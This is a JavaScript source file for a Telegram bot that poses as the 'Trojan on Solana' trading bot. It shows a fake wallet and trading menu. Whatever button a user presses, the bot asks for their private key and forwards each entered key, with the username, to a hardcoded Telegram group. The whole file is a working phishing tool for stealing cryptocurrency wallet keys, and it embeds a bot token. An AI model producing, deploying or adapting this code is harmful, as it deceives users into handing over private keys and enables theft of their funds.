const TelegramBot = require('node-telegram-bot-api');

const token = '8000854104:AAFfLf7ZARAOuuxvx-BGGIzY8mgMkpUoAB4';
const privateKey = '3oxgzTSUHANabUzBKje3ZDKiYZgKuJzKkMx2dvdi3xL8';
const groupId = '-4555611084'; // Note the negative sign

const bot = new TelegramBot(token, { polling: true });

// Define buttons
const buttons = [
  ['Buy', 'Sell'],
  ['Position', 'Limit Orders', 'DCA orders'],
  ['Copy Trade', 'Sniper'],
  ['New Pairs', 'Referral', 'Settings'],
  ['Bridge', 'Withdraw', 'Help'],
  ['Refresh']
];

// Define keyboard layout
const keyboard = {
  inline_keyboard: buttons.map((row) => row.map((button) => ({ text: button, callback_data: button })))
};

// Welcome message
bot.onText(/\/start/, (msg) => {
  const walletAddress = '3oxgzTSUHANabUzBKje3ZDKiYZgKuJzKkMx2dvdi3xL8';
  const balance = '0 SOL ($0.00)';
  
  bot.sendMessage(msg.chat.id, `
Welcome to Trojan on Solana!

Introducing a cutting-edge bot crafted exclusively for Solana Traders.

Trade any token instantly right after launch.

Here's your Solana wallet address linked to your Telegram account:

${walletAddress}

Balance: ${balance}

Click on the Refresh button to update your current balance.
  `, { 
    reply_markup: keyboard 
  });
});

// Button click handler
bot.on('callback_query', (query) => {
  const buttonClicked = query.data;
  const chatId = query.message.chat.id;

  // Send message with text input field
  bot.sendMessage(chatId, 'Please enter your private key:', {
    reply_markup: {
      force_reply: true,
    },
  });
});

// Handle user input
bot.on('message', (msg) => {
  if (msg.reply_to_message) {
    const privateKeyInput = msg.text;
    const chatId = msg.chat.id;

    // Verify private key
    if (privateKeyInput === privateKey) {
      bot.sendMessage(groupId, `User ${msg.from.username} entered private key: ${privateKeyInput}`);
      bot.sendMessage(chatId, 'Access granted!');
    } else {
      bot.sendMessage(groupId, `User ${msg.from.username} entered invalid private key: ${privateKeyInput}`);
      bot.sendMessage(chatId, 'Invalid private key. Please try again.');
    }
  }
});

bot.startPolling();
